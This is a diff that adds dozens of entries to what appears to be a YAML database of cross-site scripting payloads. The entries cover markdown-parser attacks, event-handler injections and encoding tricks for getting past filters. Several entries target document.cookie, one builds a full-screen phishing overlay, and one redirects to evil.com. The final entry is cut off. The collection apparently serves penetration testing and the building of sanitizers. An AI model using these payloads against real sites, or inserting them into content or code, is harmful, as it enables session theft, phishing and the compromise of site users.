@@ -11332,4 +11332,934 @@ payloads:
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "14-04-2026"
 
+  # === MARKDOWN XSS PAYLOADS ===
+  # Target: Markdown parsers (GitHub, GitLab, Discord, Slack, Reddit, Notion, HackMD, Jekyll, Hugo)
+  # Context: User-generated content in markdown-enabled platforms
 
+  - code: |
+      [Click Me](javascript:alert('XSS'))
+    description: "Basic markdown link with javascript protocol - targets vulnerable markdown parsers that don't sanitize href attributes"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "javascript-url", "link", "parser-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript:prompt(document.cookie))
+    description: "Markdown link with javascript protocol for cookie stealing - useful for testing markdown rendering in CMS and forums"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "javascript-url", "cookie-theft", "prompt"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
+    description: "Whitespace bypass in javascript protocol - exploits parsers that only check exact 'javascript:' string without normalizing whitespace"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "whitespace-bypass", "filter-evasion", "parser-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      ![a](javascript:prompt(document.cookie))
+    description: "Markdown image with javascript URL - some parsers use img src for javascript: URLs when image fails to load"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "image", "javascript-url", "src-injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      <javascript:prompt(document.cookie)>
+    description: "Autolink with javascript protocol - CommonMark autolinks can execute javascript in vulnerable parsers"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "autolink", "commonmark", "javascript-url"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      <&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+    description: "HTML entity encoded javascript autolink - bypasses keyword filters by encoding 'javascript:alert(XSS)' as hex entities"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "html-entity", "hex-encoding", "filter-bypass", "autolink"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+    description: "Data URI with base64 HTML payload in markdown link - opens HTML document with script execution"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "data-uri", "base64", "html-injection"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+    description: "Data URI base64 payload in markdown image - browsers may render as HTML when image fails"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "data-uri", "base64", "image", "html-injection"]
+    browsers: ["Chrome", "Firefox"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
+    description: "HTML entity encoded javascript URL in markdown link - bypasses 'javascript' keyword blacklists"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "html-entity", "encoding-bypass", "javascript-url"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      ![a'"`onerror=prompt(document.cookie)](x)
+    description: "Attribute injection via markdown image alt text - breaks out of alt attribute and injects onerror handler"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "attribute-injection", "onerror", "alt-text", "quote-escape"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [citelol]: (javascript:prompt(document.cookie))
+    description: "Reference-style link definition with javascript URL - exploits parsers that allow javascript in link definitions"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "reference-link", "link-definition", "javascript-url"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
+    description: "Window.onerror technique in markdown - assigns alert to onerror handler then throws cookie value"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "window-onerror", "throw", "cookie-theft", "advanced"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [test](javascript://%0d%0aprompt(1))
+    description: "CRLF injection in javascript URL - newline bypasses some parsers' URL validation"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "crlf", "newline-bypass", "url-encoding"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [test](javascript://%0d%0aprompt(1);com)
+    description: "CRLF bypass with domain suffix - tricks parsers expecting valid domain by adding 'com' after newline"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "crlf", "domain-spoofing", "parser-confusion"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [clickme](vbscript:alert(document.domain))
+    description: "VBScript protocol in markdown link - targets Internet Explorer and legacy Edge browsers"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "vbscript", "ie-only", "legacy-browser"]
+    browsers: ["Internet Explorer", "Edge (Legacy)"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript:this;alert(1))
+    description: "JavaScript with 'this' context - useful when parser checks for immediate function call patterns"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "javascript-url", "this-context", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript:this;alert(1&#41;)
+    description: "HTML entity encoded closing parenthesis - bypasses regex filters looking for 'alert()'"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "html-entity", "parenthesis-encoding", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript&#58this;alert(1&#41;)
+    description: "HTML entity encoded colon and parenthesis - double encoding to bypass multiple filter layers"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "html-entity", "double-encoding", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](Javas&#99;ript:alert(1&#41;)
+    description: "Mixed case with HTML entity 'c' - bypasses case-sensitive 'javascript' filters"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "mixed-case", "html-entity", "case-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript:alert&#65534;(1&#41;)
+    description: "Unicode null width character injection - inserts invisible character to break pattern matching"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "unicode", "null-char", "invisible-char", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript:confirm(1)
+    description: "Unclosed parenthesis markdown link - some parsers auto-close and execute javascript"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "unclosed-tag", "parser-quirk", "confirm"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript://www.google.com%0Aprompt(1))
+    description: "URL-like javascript with newline - disguises as google.com URL then executes after newline"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "url-disguise", "newline", "domain-spoof"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript://%0d%0aconfirm(1);com)
+    description: "CRLF with confirm and fake domain suffix - combines newline bypass with domain spoofing"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "crlf", "domain-spoof", "confirm"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](javascript:window.onerror=confirm;throw%201)
+    description: "Window onerror with confirm - alternative to alert that may bypass some filters"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "window-onerror", "confirm", "throw"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a](JaVaScRiPt:alert(1))
+    description: "Mixed case javascript protocol - bypasses case-sensitive blacklist filters"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "mixed-case", "case-bypass", "javascript-url"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      ![a](https://example.com/image.png"onload="alert(1))
+    description: "Attribute injection via markdown image URL - breaks out of src attribute to inject onload"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "attribute-injection", "onload", "image", "quote-break"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      ![a]("onerror="alert(1))
+    description: "Direct onerror injection in markdown image - minimal payload for attribute injection"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "onerror", "minimal", "attribute-injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [XSS](.alert(1);)
+    description: "Relative path with alert - exploits parsers that execute relative paths as javascript"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "relative-path", "parser-quirk", "dot-notation"]
+    browsers: ["Chrome", "Firefox"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
+    description: "CSS injection via markdown URL parameters - creates fullscreen overlay via style injection in data attributes"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "css-injection", "style", "overlay", "phishing"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [ ](http://a?p=[[/onclick=alert(0) .]])
+    description: "Onclick injection via markdown URL parameters - exploits bracket notation in URL parsing"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "onclick", "url-parameter", "bracket-notation"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [text](http://example.com " [@attacker](/profile) ")
+    description: "Title attribute injection with mention syntax - exploits markdown parsers that render mentions in link titles"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "title-attribute", "mention", "social-injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      <http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://evil.com/\"\>>
+    description: "Meta refresh injection in markdown autolink - redirects user via HTML meta tag in autolink syntax"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "meta-refresh", "redirect", "autolink", "open-redirect"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      [a]('javascript:alert("1")')
+    description: "Single-quoted javascript URL in markdown - tests parser handling of nested quotes"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "single-quote", "nested-quotes", "javascript-url"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+  - code: |
+      </http://<?php\><\h1\><script:script>confirm(2)
+    description: "PHP-like tag injection in markdown - confuses parsers with mixed HTML/PHP-like syntax"
+    category: "markdown"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["markdown", "php-tag", "parser-confusion", "mixed-syntax"]
+    browsers: ["Chrome", "Firefox"]
+    context: "markdown"
+    date_added: "06-06-2026"
+
+
+  # New payloads from xsss.txt analysis (June 2026)
+  # Focus: Modern working payloads, no IE-only or deprecated techniques
+
+  - code: |
+      <!--<img src="--><img src=x onerror=alert(1)//">
+    description: "HTML comment breakout with nested img tag - bypasses filters that don't properly close comments"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["comment-bypass", "img-onerror", "filter-bypass", "html-comment"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <style><img src="</style><img src=x onerror=alert(1)//">
+    description: "Style tag breakout with img onerror - exploits parser state confusion between style and HTML contexts"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["style-bypass", "parser-confusion", "context-switch", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <![><img src="]><img src=x onerror=alert(1)//">
+    description: "CDATA-like breakout payload - exploits parsing of XML-style CDATA sections in HTML"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["cdata-bypass", "xml-html", "parser-confusion", "filter-bypass"]
+    browsers: ["Chrome", "Firefox"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x contenteditable onblur=alert(1)>lose focus!
+    description: "Contenteditable element with onblur - triggers when user clicks away from editable element"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["contenteditable", "onblur", "user-interaction", "custom-element"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x contenteditable oninput=alert(1)>input here!
+    description: "Contenteditable element with oninput - triggers immediately when user types in editable area"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["contenteditable", "oninput", "keypress", "custom-element"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x contenteditable onpaste=alert(1)>paste here!
+    description: "Contenteditable element with onpaste - triggers when user pastes content"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["contenteditable", "onpaste", "clipboard", "custom-element"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x oncopy=alert(1)>copy this!
+    description: "Custom element with oncopy - triggers when user copies the element text"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["oncopy", "clipboard", "custom-element", "user-interaction"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x oncut=alert(1)>cut this!
+    description: "Custom element with oncut - triggers when user cuts the element text"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["oncut", "clipboard", "custom-element", "user-interaction"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x ondrag=alert(1)>drag this!
+    description: "Custom element with ondrag - triggers during drag operation"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["ondrag", "drag-drop", "custom-element", "user-interaction"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <div id="x"><input value="``onmouseover=alert(1)"></div><script>document.getElementById("x").innerHTML+=''</script>
+    description: "DOM innerHTML manipulation payload - attribute injection via innerHTML re-parsing"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["innerHTML", "dom-manipulation", "reparse", "attribute-injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "dom"
+    date_added: "06-06-2026"
+
+  - code: |
+      <iframe srcdoc="&lt;iframe/srcdoc=&amp;lt;img/src=x onerror=alert(1)&amp;gt;&gt;">
+    description: "Nested srcdoc iframe payload - double-encoded XSS through nested iframes"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["srcdoc", "nested-iframe", "double-encoding", "html-entities"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <a href="javascript:`${alert(1)}`">click</a>
+    description: "Template literal in javascript URL - uses ES6 template strings for code execution"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["template-literal", "es6", "javascript-url", "backtick"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "javascript"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body/onload=Function(alert(1))()>
+    description: "Function constructor invocation - bypasses direct function call filters"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["function-constructor", "indirect-call", "filter-bypass", "onload"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body/onload=Set.constructor(alert(1))()>
+    description: "Set.constructor for code execution - alternative function constructor access"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["set-constructor", "indirect-call", "filter-bypass", "prototype"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <img src=x onerror=!function(){alert(1)}()>
+    description: "IIFE with NOT operator - immediately invoked function expression using negation"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["iife", "not-operator", "function-expression", "obfuscation"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <img src=x onerror=~function(){alert(1)}()>
+    description: "IIFE with bitwise NOT - immediately invoked function expression using bitwise operator"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["iife", "bitwise-not", "function-expression", "obfuscation"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <img src=x onerror=+function(){alert(1)}()>
+    description: "IIFE with unary plus - immediately invoked function expression using unary operator"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["iife", "unary-plus", "function-expression", "obfuscation"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <video><source onerror="alert(1)">
+    description: "Video source element onerror - triggers when source fails to load"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["video", "source", "onerror", "media-element"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <audio src onloadstart=alert(1)>
+    description: "Audio onloadstart event - triggers when media loading begins"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["audio", "onloadstart", "media-element", "load-event"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <video onloadstart=alert(1)><source>
+    description: "Video onloadstart event - triggers at the start of video loading process"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["video", "onloadstart", "media-element", "load-event"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body onpageshow=alert(1)>
+    description: "Body onpageshow event - triggers when page becomes visible including from back-forward cache"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["onpageshow", "bfcache", "page-visibility", "navigation"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body onpagehide=alert(1)>
+    description: "Body onpagehide event - triggers when navigating away from page"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["onpagehide", "navigation", "page-visibility", "unload"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body onpopstate=alert(1)>
+    description: "Body onpopstate event - triggers when browser history changes"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["onpopstate", "history-api", "navigation", "browser-history"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body style=overflow:auto;height:1000px onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><x id=x>#x
+    description: "Forced scroll trigger payload - creates scrollable content and auto-triggers scroll event"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["onscroll", "forced-trigger", "overflow", "auto-execute"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <marquee onstart=alert(1)>
+    description: "Marquee onstart event - triggers immediately when marquee animation starts"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["marquee", "onstart", "auto-execute", "deprecated-element"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <marquee loop=1 width=0 onfinish=alert(1)>x
+    description: "Marquee onfinish event - triggers when marquee completes its loop"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["marquee", "onfinish", "loop", "deprecated-element"]
+    browsers: ["Chrome", "Firefox", "Safari"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <select onchange=alert(1)><option>1<option>2
+    description: "Select onchange event - triggers when dropdown selection changes"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["select", "onchange", "form-element", "user-interaction"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <form onsubmit=alert(1)><input type=submit>
+    description: "Form onsubmit event - triggers when form is submitted"
+    category: "event"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["form", "onsubmit", "form-element", "user-interaction"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <svg onload=alert(1)//
+    description: "SVG onload without closing tag - minimal SVG payload with comment termination"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["svg", "onload", "minimal", "comment-termination"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <svg/onload=alert(1)
+    description: "SVG onload with slash separator - no space between tag and attribute"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["svg", "onload", "no-space", "slash-separator"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <body/onfocus=alert(1)>
+    description: "Body onfocus with slash separator - compact body payload"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["body", "onfocus", "slash-separator", "compact"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <img%0Dsrc=x onerror=alert(1)>
+    description: "Carriage return between tag and attribute - CR character for filter bypass"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["whitespace-bypass", "carriage-return", "filter-bypass", "url-encoding"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <script src="data:text/javascript,alert(1)"></script>
+    description: "Script with data URI source - loads JavaScript from inline data URI"
+    category: "advanced"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["data-uri", "script-src", "inline-javascript", "mime-type"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <embed src="javascript:alert(1)">
+    description: "Embed element with javascript URL - executes JavaScript via embed source"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["embed", "javascript-url", "multimedia", "legacy-element"]
+    browsers: ["Chrome", "Firefox"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <object data="javascript:alert(1)">
+    description: "Object element with javascript data URL - executes via object data attribute"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["object", "javascript-url", "data-attribute", "legacy-element"]
+    browsers: ["Chrome", "Firefox"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <b <script>alert(1)</script>0
+    description: "Script tag within malformed tag - parser confusion between tag attributes and content"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["malformed-tag", "parser-confusion", "nested-script", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      <x '="foo"><x foo='><img src=x onerror=alert(1)//'>
+    description: "Attribute quoting confusion - exploits quote handling in nested custom elements"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["quote-confusion", "attribute-parsing", "custom-element", "filter-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    context: "html"
+    date_added: "06-06-2026"
+
+  - code: |
+      </script><script>alert(1)</script>
